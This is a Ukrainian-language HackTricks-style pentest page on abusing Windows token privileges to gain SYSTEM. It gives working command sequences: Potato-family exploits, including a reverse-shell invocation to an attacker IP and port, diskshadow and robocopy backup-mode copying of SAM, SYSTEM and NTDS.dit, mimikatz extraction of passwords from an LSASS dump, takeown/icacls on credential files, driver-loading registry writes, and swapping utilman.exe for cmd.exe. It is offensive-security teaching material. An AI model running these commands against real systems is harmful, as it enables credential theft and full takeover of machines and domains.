# Зловживання Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку перед продовженням:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи tokens, які вже маєте**

### SeImpersonatePrivilege

Це privilege, яке має будь-який процес, і воно дозволяє impersonation (але не creation) будь-якого token, якщо до нього можна отримати handle. Привілейований token можна отримати з Windows service (DCOM), змусивши його виконати NTLM authentication проти exploit, після чого стає можливим запуск process із SYSTEM privileges. Цю vulnerability можна експлуатувати за допомогою різних tools, таких як [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (який вимагає, щоб winrm було disabled), [SweetPotato](https://github.com/CCob/SweetPotato), і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Сучасні примітки для operator:

- **JuicyPotato — legacy**: у Windows 10 1809+/Server 2019+ краще використовувати **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** залежно від того, яка RPC/COM surface ще reachable.
- Якщо ви скомпрометували service, що працює як **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, і `whoami /priv` показує **filtered token** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спочатку відновіть **default privilege set** цього account (наприклад, за допомогою **FullPowers**), а потім повторіть family potato.
- Деякі новіші forks зручніші для operator, ніж оригінальні tools. Наприклад, **SigmaPotato** додає reflection/in-memory execution і сучасну сумісність із Windows, тоді як **PrintNotifyPotato** зловживає PrintNotify COM service і часто корисний, коли classic Spooler path disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**, воно використовуватиме **той самий метод** для отримання privileged token.\
Потім цей privilege дозволяє **призначити primary token** новому/призупиненому процесу. За допомогою privileged impersonation token можна отримати primary token (DuplicateTokenEx).\
З token можна створити **новий процес** за допомогою 'CreateProcessAsUser' або створити процес у suspended стані та **встановити token** (зазвичай не можна змінити primary token запущеного процесу).

### SeTcbPrivilege

Якщо у вас увімкнено цей token, ви можете використовувати **KERB_S4U_LOGON**, щоб отримати **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну групу** (admins) до token, встановити **integrity level** token на "**medium**" і призначити цей token **поточному потоку** (SetThreadToken).

### SeBackupPrivilege

Цей privilege змушує систему **надавати весь доступ на читання** до будь-якого файлу (лише для операцій читання). Його використовують для **читання password hashes локальних облікових записів Administrator** з registry, після чого можна застосувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (Pass-the-Hash technique). Однак ця technique не працює за двох умов: коли Local Administrator account вимкнено, або коли діє policy, яка забирає administrative rights у Local Administrators, що підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай — **VSS + `robocopy /b`**: створити/відкрити shadow copy, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Права на **запис** у будь-який системний файл, незалежно від Access Control List (ACL) файла, надаються цим привілеєм. Це відкриває багато можливостей для privilege escalation, включно з можливістю **modify services**, виконання DLL Hijacking та встановлення **debuggers** через Image File Execution Options, серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач має можливість impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість залежить від здатності impersonate token, що представляє того самого користувача і чий integrity level не перевищує integrity level поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можливо використати SeCreateTokenPrivilege для EoP, impersonating tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб цільовий token належав тому самому користувачу і мав integrity level, менший або рівний integrity level процесу, що намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і підсилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дозволяє **load and unload device drivers** шляхом створення запису реєстру зі специфічними значеннями `ImagePath` і `Type`. Оскільки прямий запис у `HKLM` (HKEY_LOCAL_MACHINE) обмежений, потрібно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб зробити `HKCU` розпізнаваним ядром для конфігурації драйвера, потрібно дотриматися певного шляху.

Сучасне offensive використання зазвичай — це **BYOVD** (bring your own vulnerable driver): завантажити **signed but vulnerable** kernel driver і потім використати його IOCTLs, щоб вимкнути захист або перейти до kernel code execution. Пам’ятайте, що на новіших збірках Windows 11/Server **Microsoft vulnerable driver blocklist** і/або **HVCI/Memory Integrity** часто ламають старі публічні ланцюжки, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях: `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. Усередині `HKCU` потрібно створити весь цей шлях і встановити два значення:

- `ImagePath`, який є шляхом до бінарного файла, що буде виконаний
- `Type`, зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Доступайтеся до `HKCU` замість `HKLM` через обмежений write access.
2. Створіть шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` всередині `HKCU`, де `<RID>` представляє Relative Identifier поточного користувача.
3. Встановіть `ImagePath` на шлях виконання binary.
4. Призначте `Type` як `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим привілеєм у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє процесу **приймати право власності на об’єкт**, обходячи вимогу явного discretionary access через надання WRITE_OWNER access rights. Процес полягає спочатку в отриманні права власності на потрібний registry key для цілей запису, а потім у зміні DACL, щоб увімкнути операції запису.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Цей privilege дозволяє **debug other processes**, включно з читанням і записом у memory. За цим privilege можна використовувати різні стратегії memory injection, здатні обходити більшість antivirus та host intrusion prevention solutions.

На сучасному Windows, пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні tokens, але це **не** гарантія, що ви зможете торкнутися **LSASS**. Якщо **RunAsPPL / LSA Protection** увімкнено, non-protected processes не можуть читати або inject у LSASS навіть якщо присутній `SeDebugPrivilege`. У такому разі вкрадіть token з іншого non-PPL SYSTEM process, або ланцюжком використайте PPL bypass/BYOVD замість припущення, що `procdump` спрацює. Для повного прикладу копіювання token з використанням `SeDebugPrivilege` + `SeImpersonatePrivilege`, дивіться [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може стосуватися процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після успішного входу в систему.

Потім ви можете завантажити цей dump у mimikatz, щоб отримати passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати `NT SYSTEM` shell, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати raw volume device handles (наприклад, \\.\C:) для прямого disk I/O, що обходить NTFS ACLs. З ним можна копіювати байти будь-якого файлу на томі, читаючи базові блоки, що дає змогу arbitrary file read чутливих даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Це особливо критично на CA servers, де exfiltrating CA private key дає змогу forge Golden Certificate, щоб impersonate будь-який principal.

Див. детальні techniques і mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
The **tokens that appear as Disabled** зазвичай можна увімкнути, тож ви часто можете зловживати як _Enabled_, так і _Disabled_ привілеями.

### Увімкнути всі tokens

Якщо у вас є disabled привілеї, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet привілеїв token є на [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи використати привілей, щоб отримати admin session або прочитати чутливі файли.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Я спробую незабаром перефразувати це у більш recipe-like вигляд.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читайте sensitive files за допомогою `robocopy /b` або спеціальних helper-ів копіювання, що підтримують SeBackup.                                                                                                                                                                                                                                                                 | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а іноді й для `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціальні SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створіть arbitrary token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Дублюйте **non-PPL** SYSTEM token або злийте memory з non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping зазвичай заблоковано, якщо увімкнено RunAsPPL/LSA Protection.</p><p>Script можна знайти на [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використайте **Potato family** / named-pipe impersonation, щоб запустити SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Найпрактичніше з service accounts, такими як IIS APPPOOL, MSSQL, scheduled tasks, або з будь-якого контексту, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Завантажте signed-but-vulnerable kernel driver (BYOVD)<br>2. Використайте IOCTLs драйвера, щоб отримати kernel R/W, вимкнути security tooling або підвищити права до SYSTEM<br><br>Alternatively, цей privilege можна використати, щоб вивантажити security-related drivers за допомогою вбудованої команди <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старі public drivers, такі як <code>szkg64.sys</code>, на сучасному Windows дедалі частіше блокуються vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустіть PowerShell/ISE із наявним privilege SeRestore.<br>2. Увімкніть privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменуйте utilman.exe на utilman.old<br>4. Перейменуйте cmd.exe на utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack може бути detected деяким AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack може бути detected деяким AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Маніпулюйте tokens так, щоб вони містили local admin rights. Може вимагати SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Подивіться на цю таблицю, що визначає Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Подивіться на [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) про privesc з tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
